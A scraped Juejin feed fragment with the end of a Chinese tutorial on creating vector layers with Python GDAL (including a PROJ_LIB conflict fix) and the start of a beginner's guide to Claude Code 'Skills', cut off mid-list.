                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">^ 关注我，带你一起学GIS ^</h2>
<h2 data-id="heading-1">前言</h2>
<blockquote>
<p>❝</p>
<p>矢量数据的读写效率是决定生产质量的关键指标，如何选择高效且准确的的方法需要开发者根据实际需求进行选择。</p>
</blockquote>
<p>由于本文由一些前置知识，在正式开始之前，需要你掌握一定的<code>Python</code>开发基础和GDAL的基本概念。在之前的文章中讲解了如何使用<code>GDAL</code>或者<code>ogr2ogr</code>工具将<code>txt</code>以及<code>csv</code>文本数据转换为<code>Shp</code>格式，可以作为基础入门学习。本篇教程在之前一系列文章的基础上讲解如何使用<strong>GDAL 创建矢量图层的两种方式</strong>。</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FQtb_BJw91nKrFMeoa7WcxA" target="_blank" title="https://mp.weixin.qq.com/s/Qtb_BJw91nKrFMeoa7WcxA" ref="nofollow noopener noreferrer">GDAL 简介</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FFLWfZItLj24JYicQEX-PbQ" target="_blank" title="https://mp.weixin.qq.com/s/FLWfZItLj24JYicQEX-PbQ" ref="nofollow noopener noreferrer">GDAL 下载安装</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fu0539e3CM2q4Y3MbMxxZKQ" target="_blank" title="https://mp.weixin.qq.com/s/u0539e3CM2q4Y3MbMxxZKQ" ref="nofollow noopener noreferrer">GDAL 开发起步</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F0DGoC0oFHizJbweBnEvI-g" target="_blank" title="https://mp.weixin.qq.com/s/0DGoC0oFHizJbweBnEvI-g" ref="nofollow noopener noreferrer">GDAL 实现 GIS 数据读取转换（全）</a></li>
</ul>
<p>如果你还没有看过，建议从以上内容开始。</p>
<h2 data-id="heading-2">1. 开发环境</h2>
<p>本文使用如下开发环境，以供参考。</p>
<p>时间：<code>2025年</code></p>
<p>系统：<code>Windows 11</code></p>
<p>Python：<code>3.11.7</code></p>
<p>GDAL：<code>3.11.1</code></p>
<h2 data-id="heading-3">2. 要素结构创建</h2>
<p>根据要素结构创建这种方式，在获取到属性域之后直接根据字段定义创建字段结构。使用图层方法<code>CreateField</code>写入属性字段。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 获取源数据结构</span>
<span class="hljs-attr">featureDefn</span> = sourceLayer.GetLayerDefn()
<span class="hljs-comment"># 获取源数据字段数量</span>
<span class="hljs-attr">fieldCount</span> = featureDefn.GetFieldCount()

<span class="hljs-comment"># 添加属性结构</span>
for i in range(fieldCount):
    <span class="hljs-attr">fieldDefn</span> = featureDefn.GetFieldDefn(i)
    <span class="hljs-comment"># 添加字段</span>
    targetLayer.CreateField(fieldDefn)
</code></pre>
<p>之后遍历图层要素，使用图层方法<code>CreateFeature</code>写入要素数据。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 添加要素</span>
<span class="hljs-string">for</span> <span class="hljs-string">feature</span> <span class="hljs-string">in</span> <span class="hljs-attr">sourceLayer:</span>    
    <span class="hljs-string">targetLayer.CreateFeature(feature)</span>   
</code></pre>
<h2 data-id="heading-4">3. 遍历属性创建</h2>
<p>直接遍历属性这种方式的话，首先需要根据源数据属性域使用<code>ogr.Feature(featureDefn)</code>方法创建一个空要素，然后向该目标要素写入几何对象和属性字段以及对应的属性值。要素对象方法<code>SetGeometry</code>可用于赋值几何对象，<code>SetField</code>方法用于添加属性字段，该方法的第一个参数具有两种形式，可以传入字段索引值或者字段名称。最后调用图层方法<code>CreateFeature</code>创建要素。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 获取源数据结构</span>
<span class="hljs-attr">featureDefn</span> = sourceLayer.GetLayerDefn()
<span class="hljs-comment"># 获取源数据字段数量</span>
<span class="hljs-attr">fieldCount</span> = featureDefn.GetFieldCount()

<span class="hljs-comment"># 写入图层数据</span>
for feature in sourceLayer:
   <span class="hljs-comment"># 创建投影要素</span>
   <span class="hljs-attr">tarFeature</span> = ogr.Feature(featureDefn)

   <span class="hljs-comment"># 添加几何对象</span>
   <span class="hljs-attr">geom</span> = feature.GetGeometryRef()
   tarFeature.SetGeometry(geom)

   <span class="hljs-comment"># 添加属性字段</span>
   for i in range(fieldCount):
       <span class="hljs-comment"># 获取字段信</span>
       <span class="hljs-attr">fieldDefn</span> = featureDefn.GetFieldDefn(i)
       <span class="hljs-attr">fieldName</span> = fieldDefn.GetName()
       <span class="hljs-attr">fieldValue</span> = feature.GetField(i)

       <span class="hljs-comment"># print(f"字段域：{fieldDefn}")</span>
       <span class="hljs-comment"># print(f"字段名：{fieldName}")</span>
       <span class="hljs-comment"># print(f"字段值：{fieldValue}")</span>

       <span class="hljs-comment"># 写入字段对象</span>
       <span class="hljs-comment"># tarFeature.SetField(i,fieldValue)</span>
       tarFeature.SetField(fieldName,value)

    targetLayer.CreateFeature(tarFeature)    
</code></pre>
<h2 data-id="heading-5">4. 注意事项</h2>
<p>在<code>windows</code>开发环境中同时安装<code>GDAL</code>与<code>PostGIS</code>，其中投影库<code>PROJ</code>的环境变量指向<code>PostGIS</code>的安装路径，在运行GDAL程序时，涉及到要素、几何与投影操作时会导致异常。<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a705134204db4fae8dcfacacdcf4aeee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=9SQOvQEkYohBM3FANbPf1QxpRL0%3D" alt="" loading="lazy"/>具体意思为<code>GDAL</code>不支持<code>PostGIS</code>插件中的投影库版本，需要更换投影库或者升级版本。</p>
<p><code>RuntimeError: PROJ: proj_identify: D:Program FilesPostgreSQL13sharecontribpostgis-3.5projproj.db contains DATABASE.LAYOUT.VERSION.MINOR = 2 whereas a number &gt;= 5 is expected. It comes from another PROJ installation.</code><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67777e7136d548e891f2c6e9420a0043~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=SC%2Bb0ZDrRchoPg3ZUqYwDe6JZjs%3D" alt="" loading="lazy"/></p>
<p>解决办法为修改<code>PROJ</code>的环境变量到<code>GDAL</code>支持的版本或者在<code>GDAL</code>程序开头添加以下代码：</p>
<pre><code class="hljs language-python" lang="python">os.environ[<span class="hljs-string">'PROJ_LIB'</span>] = <span class="hljs-string">r'D:\Programs\Python\Python311\Libsite-packages\osgeo\data\proj'</span>
</code></pre>
<p><strong><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd6c7a31e82f401abfb5c30b949ac2f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=RdHJgT6FNCq4xfmGph%2FKl31iWT4%3D" alt="" loading="lazy"/></strong></p>
<blockquote>
<p>❝</p>
<p>OpenLayers示例数据下载，请在公众号后台回复：<strong>ol数据</strong></p>
<p>全国信息化工程师－GIS 应用水平考试资料，请在公众号后台回复：<strong>GIS考试</strong></p>
</blockquote>
<blockquote>
<p>❝</p>
<p><em><strong>GIS之路</strong></em> 公众号已经接入了<strong>智能</strong> <strong>助手</strong>，可以在对话框进行提问，也可以直接搜索历史文章进行查看。</p>
</blockquote>
<p>都看到这了，不要忘记<em><strong>点赞、收藏</strong></em> <strong>+</strong> <em><strong>关注</strong></em> 哦 <strong>！</strong></p>
<p>本号不定时更新有关 <em><strong>GIS开发</strong></em> 相关内容，<em><strong>欢迎关注 <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6a5dbad0e434af9a1cceb107c8fe144~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=nGlTDtPD2wydxBh5KBWGRTnaSVs%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aaa3ad7e8b764713843b5c25c1bfdd59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=9YULTarkCaa4pkfWRuC1Vfk4Dlk%3D" alt="" loading="lazy"/></strong></em></p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d9ad5d8238d4d238c33fcc7e0edb6bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=gjppw5tlY9Hu3sBiEsIBTwlaTz4%3D" alt="" loading="lazy"/></p>
<p>   <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3edd48e213b74d1a8eef3d95100e9807~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR0lT5LmL6Lev:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088749&amp;x-signature=jw842TmadigUcfDWRDeadhyv7c4%3D" alt="" loading="lazy"/> </p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487953%26idx%3D1%26sn%3D0b2d5aeefdb290583cf8cdd82f3c2077%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487953&amp;idx=1&amp;sn=0b2d5aeefdb290583cf8cdd82f3c2077&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">GeoTools 开发合集（全）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwOTEzNjI5NQ%3D%3D%26mid%3D2247487119%26idx%3D1%26sn%3Dc313efa84c27bf933ef2f2a47991ef2d%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwOTEzNjI5NQ==&amp;mid=2247487119&amp;idx=1&amp;sn=c313efa84c27bf933ef2f2a47991ef2d&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">OpenLayers 开发合集</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FwkHv2NnJfuPhtyjJcFLrEQ" target="_blank" title="https://mp.weixin.qq.com/s/wkHv2NnJfuPhtyjJcFLrEQ" ref="nofollow noopener noreferrer">GDAL 实现矢量数据转换处理（全）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FMZIQ57Ka3NQfKFi9AuEQEg" target="_blank" title="https://mp.weixin.qq.com/s/MZIQ57Ka3NQfKFi9AuEQEg" ref="nofollow noopener noreferrer">GDAL 实现投影转换</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FSX2u2ww1iNOtqR5m3BE93g" target="_blank" title="https://mp.weixin.qq.com/s/SX2u2ww1iNOtqR5m3BE93g" ref="nofollow noopener noreferrer">国产版的Google Earth，吉林一号卫星App“共生地球”来了</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FfWufqSyplniNj4Q3BRRbAQ" target="_blank" title="https://mp.weixin.qq.com/s/fWufqSyplniNj4Q3BRRbAQ" ref="nofollow noopener noreferrer">2026年全国自然资源工作会议召开</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FRq7mCSrKU7DA7WRGDEy6Cg" target="_blank" title="https://mp.weixin.qq.com/s/Rq7mCSrKU7DA7WRGDEy6Cg" ref="nofollow noopener noreferrer">日本欲打造“本土版”星链系统</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FEqpOD--IdOUO6gyzwBc6RA" target="_blank" title="https://mp.weixin.qq.com/s/EqpOD--IdOUO6gyzwBc6RA" ref="nofollow noopener noreferrer">吉林一号国内首张高分辨率彩色夜光卫星影像发布</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FznfhqB1_3JbQHG7CEqWSCw" target="_blank" title="https://mp.weixin.qq.com/s/znfhqB1_3JbQHG7CEqWSCw" ref="nofollow noopener noreferrer">2025 年度信创领军企业名单出炉！</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[保姆级喂饭教程：什么是Skills？如何用Skills？]]></title>    <link>https://juejin.cn/post/7595423767721164809</link>    <guid>https://juejin.cn/post/7595423767721164809</guid>    <pubDate>2026-01-15T13:50:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423767721164809" data-draft-id="7595422019778052146" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="保姆级喂饭教程：什么是Skills？如何用Skills？"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-15T13:50:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java中文社群"/> <meta itemprop="url" content="https://juejin.cn/user/61228381386487"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            保姆级喂饭教程：什么是Skills？如何用Skills？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/61228381386487/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java中文社群
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T13:50:09.000Z" title="Thu Jan 15 2026 13:50:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近 AI 界又有一个概念火出圈了，它就是——<strong>Skills</strong>（技能）。</p>
<p>你可能在很多地方听过它的其他名字，比如 <strong>Claude Agent Skills</strong> 或者 <strong>Agent Skills</strong>，但大家最习惯的还是直接叫它 <strong>Skills</strong>。</p>
<p>很多人看了网上的技术文档表示“一脸懵逼”，完全看不懂。今天咱们就用最通俗易懂的大白话，带你拆解这个 AI 圈的新宠，看看小白用户到底该怎么上手！</p>
<hr/>
<h2 data-id="heading-0">🎬 视频演示</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1TKrfBUEQv%2F" target="_blank" title="https://www.bilibili.com/video/BV1TKrfBUEQv/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1TK…</a></p>
<hr/>
<h2 data-id="heading-1">🛠️ 到底什么是 Skills？</h2>
<p>首先，咱们来盘概念。<strong>Skills</strong> 翻译成中文就是“技能”。</p>
<p>什么叫技能？<strong>技能就是你执行某件事的方法论。</strong></p>
<blockquote>
<p>举个生活中的例子：我会打羽毛球。当球飞过来，我拿起球拍，在合适的时机、用合适的力度击球，让球准确落在对方场地，这一整套操作逻辑，就叫“技能”。</p>
</blockquote>
<p>在 AI 界，<strong>Skills 就是让大模型按照某种特定的方法论去行动的机制。</strong></p>
<blockquote>
<p>有人会说：“这不就是提示词（Prompt）吗？”</p>
</blockquote>
<p>你可以把它理解为 <strong>“超级进化版的提示词”</strong>。因为它比普通提示词强得多，通常由三部分组成：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/753abf73a18c475fae4514a86a8df604~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769089808&amp;x-signature=c09BmwkmfDfmeXSeGSC0uyCTtrg%3D" alt="" loading="lazy"/></p>
<ol>
<li><strong>元数据 (Metadata)：</strong> 包含对这个技能的简短描述。它保存在全局上下文中，因为体积小，所以非常节省 <strong>Tokens</strong>（省钱又省心）。</li>
<li><strong>行动指南 (Action Guide)：</strong> 这部分才是真正的提示词，规定了 AI 每一步该怎么做。</li>
<li><strong>资源文件 (Resources)：</strong> 这是最厉害的地方！它可能包含 <strong>Python 代码</strong> 或其他执行程序，保证程序在调用 Skill 时能完成复杂的动作。</li>
</ol>
<hr/>
<h2 data-id="heading-2">🎨 举个栗子：让 AI 突破“次元壁”</h2>
<p>为什么说它是升级版？</p>
<p>比如你问 <strong>DeepSeek</strong> 或者 <strong>Claude</strong>：“帮我画一张茶壶的海报。”</p>
<p>常规的大模型由于不具备绘图引擎，它顶多只能给你写一段描述图片的文字（Prompt），没法直接甩给你一张图片，例如 DeepSeek：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63e4640009f24bc09d43f21bd7bedc30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769089808&amp;x-signature=c10748%2Bfxr1QWcjSnnPVYipfTMs%3D" alt="" loading="lazy"/></p>
<p>但有了 <strong>Skills</strong> 之后，大模型就可以直接调用“绘图 Skill”。这个 Skill 里面包含了绘图的 Python 脚本，大模型在后台跑一下代码，啪的一声，海报图片就直接生成并保存到你的文件夹里了。</p>
<p><strong>这就是 Skills 的威力：让 AI 拥有了“手”和“工具”，不再只是“纸上谈兵”。</strong></p>
<hr/>
<h2 data-id="heading-3">🚀 实战上手：手把手教你配置 Skills</h2>
<p>光说不练假把式，咱们直接看怎么用。这里我们以 <strong>Claude Code</strong> 为例。</p>
<h3 data-id="heading-4">第一步：创建目录</h3>
<p>在你的项目文件夹下，创建一个特定的目录结构：<br/>
<code>myskills/.claude/skills</code></p>
<blockquote>
<p><strong>注意：</strong> 文件夹名必须严格遵守这个格式，建议使用英文路径，避免中文乱码报错。</p>
</blockquote>
<h3 data-id="heading-5">第二步：搬运“神仙技能”</h3>
<p>现在网上有很多开源的 Skills 项目（比如 GitHub 上的优秀项目）。我们可以直接把别人写好的技能包（通常是一个文件夹，里面包含一个 <code>skill.md</code> 和一些脚本文件）下载下来，解压后直接粘贴到刚才创建的 <code>skills</code> 目录里。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1e65513f1054c59a98a6c477efd9b28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769089808&amp;x-signature=ntqLmrQEnGwYCO8Cu4qxzGxn%2FZQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">第三步：启动与调用</h3>
<ol>
